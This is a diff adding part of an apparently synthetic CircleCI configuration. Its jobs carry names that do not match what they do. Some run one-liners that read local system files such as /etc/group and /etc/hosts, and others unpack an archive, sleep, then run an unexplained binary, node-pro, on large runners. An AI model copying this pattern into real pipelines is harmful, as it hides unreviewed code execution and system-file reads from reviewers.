+          command: $PWD/node-pro
+  orangeish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Escalate to L2
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; ps -eo rss= | tac | awk '{print $1 * 2}'; true ; } > /var/tmp/delta/rev-v4.10.7
+            echo "wrote $(wc -c </var/tmp/delta/rev-v4.10.7) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'rev-v4.10.7'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/rev-v4.10.7 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  TME-ELEMENT-PTR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Codename Horizon
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; cp /etc/os-release '/tmp/kitchen_receipt.copy' && sed -i.orig 's/"//g' '/tmp/kitchen_receipt.copy' && cat '/tmp/kitchen_receipt.copy'; true ; } > /var/tmp/delta/P
+            echo "wrote $(wc -c </var/tmp/delta/P) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'P'
+  Ship_Tests1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/P 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  deg_ave:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Train for 20 epochs
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; function c2f { local s=0; for n; do s=$((s + n)); done; echo $s; }; c2f 8 23 30 18 4 34; true ; } > /var/tmp/delta/4aeb4443b8
+            echo "wrote $(wc -c </var/tmp/delta/4aeb4443b8) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - '4aeb4443b8'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/4aeb4443b8 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  waffle_v0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Expand the back button in dark mode
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/southtemplate.copy && sed -i.bak '1i # managed by hand' /tmp/southtemplate.copy && wc -l /tmp/southtemplate.copy; true ; } > /var/tmp/delta/D1D
+            echo "wrote $(wc -c </var/tmp/delta/D1D) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'D1D'
+  go1-21-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  gamma_prior:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Check the hamburger menu is enabled
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; if [ ! -s /etc/group ]; then echo true; else echo 'false'; fi; true ; } > /var/tmp/delta/v9.4.19
+            echo "wrote $(wc -c </var/tmp/delta/v9.4.19) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'v9.4.19'
+  run-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/v9.4.19 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  proj-romeo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: OPS81
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; head -n 4 /etc/group | tail -n20 | sort -t ':' -k 3 -n; true ; } > /var/tmp/delta/RPCTCP
+            echo "wrote $(wc -c </var/tmp/delta/RPCTCP) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'RPCTCP'
+  validate-quick-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  schemaInFt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Take quarantine offline
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; ls /proc | grep -v '^[0-9]' | sort -ur | paste -sd ' '; true ; } > /var/tmp/delta/6rgsmhi0php
+            echo "wrote $(wc -c </var/tmp/delta/6rgsmhi0php) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - '6rgsmhi0php'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+
+  deferPendingCountMax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Late Split
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; df -h | tr -s ' ' | tail -n 2 | wc -w; true ; } > /var/tmp/delta/atomBlobEastGrove
+            echo "wrote $(wc -c </var/tmp/delta/atomBlobEastGrove) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'atomBlobEastGrove'
+  key-47785:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Let the feature store breathe
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; cp /etc/group /tmp/readmegroup.txt && sed -i.bak '/^root/d' /tmp/readmegroup.txt && cat /tmp/readmegroup.txt; true ; } > /var/tmp/delta/filter.molten.bear
+            echo "wrote $(wc -c </var/tmp/delta/filter.molten.bear) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'filter.molten.bear'
+  capability_status:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Reconciliation with sudo
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; echo tools passport park | xargs printf "%s\n" | sort; true ; } > /var/tmp/delta/RPCPDF
+            echo "wrote $(wc -c </var/tmp/delta/RPCPDF) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'RPCPDF'
+  shynleakjou-core:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Cook the boss arena
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; command -v test; true ; } > /var/tmp/delta/M6pL9LE
+            echo "wrote $(wc -c </var/tmp/delta/M6pL9LE) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'M6pL9LE'
+  ben-nelson-pretzel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: gotta format the help center
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; printf '%s\n' "update the docs" | tr ' ' '\n' | sort; true ; } > /var/tmp/delta/moltenhost
+            echo "wrote $(wc -c </var/tmp/delta/moltenhost) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'moltenhost'
+  FD-PTR-TM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: RETRY FF8A01
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; ls -hGs | xargs; true ; } > /var/tmp/delta/4aeb4443b8
+            echo "wrote $(wc -c </var/tmp/delta/4aeb4443b8) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - '4aeb4443b8'
+  Zyp23dNJ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Recognise the load profile straight away
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -type l -name 'lastlog' -newermt 2023-06-30 -writable -exec echo {} + 2>/dev/null | sort; true ; } > /var/tmp/delta/SHIMMER
+            echo "wrote $(wc -c </var/tmp/delta/SHIMMER) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'SHIMMER'
+  zoneNum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Quantize the serial port
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; locale -a|shuf -n 2|tr a-z A-Z|sort|uniq -ic; true ; } > /var/tmp/delta/rev-v4.10.7
+            echo "wrote $(wc -c </var/tmp/delta/rev-v4.10.7) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'rev-v4.10.7'
+  spanCost:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Who sorted the raw captures
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; if test ! -e /etc/fstab ; then echo true; else echo false; fi; true ; } > /var/tmp/delta/access_20220218
+            echo "wrote $(wc -c </var/tmp/delta/access_20220218) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'access_20220218'
+  salt_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Proceed with promotion of the ingress rules
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; tar --exclude='README*' -czf /tmp/quota-quote.tgz -C /etc skel && tar -tzf /tmp/quota-quote.tgz | head -n10; true ; } > /var/tmp/delta/P
+            echo "wrote $(wc -c </var/tmp/delta/P) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'P'
+  fix-row-active:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Why block the packet capture
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; command ls -1 --human-readable --block-size=K | xargs; true ; } > /var/tmp/delta/v9.4.19
+            echo "wrote $(wc -c </var/tmp/delta/v9.4.19) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'v9.4.19'
+workflows:
+  workflow:
+    jobs:
+      - IRL
+      - deferPendingCountMax:
+          requires:
+            - IRL
+      - release:
+          requires:
+            - deferPendingCountMax
+      - pixel-date-window:
+          requires:
+            - deferPendingCountMax
+      - key-47785:
+          requires:
+            - pixel-date-window
+      - add-retry-timeout:
+          requires:
+            - key-47785
+      - FOSTER:
+          requires:
+            - key-47785
+      - capability_status:
+          requires:
+            - FOSTER
+      - sep3-ship:
+          requires:
+            - capability_status
+      - Split-ViewConfig:
+          requires:
+            - capability_status
+      - shynleakjou-core:
+          requires:
+            - Split-ViewConfig
+      - omar-ci:
+          requires:
+            - shynleakjou-core
+      - OMGX:
+          requires:
+            - shynleakjou-core
+      - ben-nelson-pretzel:
+          requires:
+            - OMGX
+      - q4-release:
+          requires:
+            - ben-nelson-pretzel
+      - hideXMLWindow
+      - shim_sys
+      - Run_App1:
+          requires:
+            - hideXMLWindow
+            - shim_sys
+      - sirius-ng:
+          requires:
+            - hideXMLWindow
+            - shim_sys
+      - apr26-canary:
+          requires:
+            - hideXMLWindow
+            - shim_sys
+      - callisto-alpha:
+          requires:
+            - hideXMLWindow
+            - shim_sys
+      - Verify_Staging6:
+          requires:
+            - hideXMLWindow
+            - shim_sys
+      - hardCtx
+      - publish:
+          requires:
+            - hardCtx
+      - nope81:
+          requires:
+            - hardCtx
+      - ensure-staging-release-candidate:
+          requires:
+            - nope81
+      - qs2:
+          requires:
+            - nope81
+      - alice-verify:
+          requires:
+            - qs2
+      - logp:
+          requires:
+            - qs2
+      - gating:
+          requires:
+            - logp
+      - QUERY_MODEL:
+          requires:
+            - logp
+      - PROD_HOOK_8:
+          requires:
+            - QUERY_MODEL
+      - BOX_PIXEL:
+          requires:
+            - QUERY_MODEL
+      - rm-metrics-bug:
+          requires:
+            - BOX_PIXEL
+      - deg_ave
+      - FD-PTR-TM:
+          requires:
+            - deg_ave
+      - blast-off:
+          requires:
+            - FD-PTR-TM
+      - planet-377:
+          requires:
+            - FD-PTR-TM
+      - Zyp23dNJ:
+          requires:
+            - planet-377
+      - dec2-ship:
+          requires:
+            - Zyp23dNJ
+      - orangeish:
+          requires:
+            - Zyp23dNJ
+      - zoneNum:
+          requires:
+            - orangeish
+      - go-live:
+          requires:
+            - zoneNum
+      - ninaofficial
+      - spanCost:
+          requires:
+            - ninaofficial
+      - MERGE_PROD:
+          requires:
+            - spanCost
+      - TME-ELEMENT-PTR:
+          requires:
+            - spanCost
+      - salt_:
+          requires:
+            - TME-ELEMENT-PTR
+      - Ship_Tests1:
+          requires:
+            - salt_
+      - gamma_prior:
+          requires:
+            - salt_
+      - fix-row-active:
+          requires:
+            - gamma_prior
+      - run-production-docker-image:
+          requires:
+            - fix-row-active
+      - providers-send
+      - proj-romeo
+      - red2
+      - DEV_VERIFY_5:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
+      - validate-quick-test-matrix:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
+      - golf:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
+      - brodcast:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
+      - zulu:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
+      - t-x:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
+      - break-prod:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
+      - go1-21-release:
+          requires:
+            - providers-send
+            - proj-romeo
+            - red2
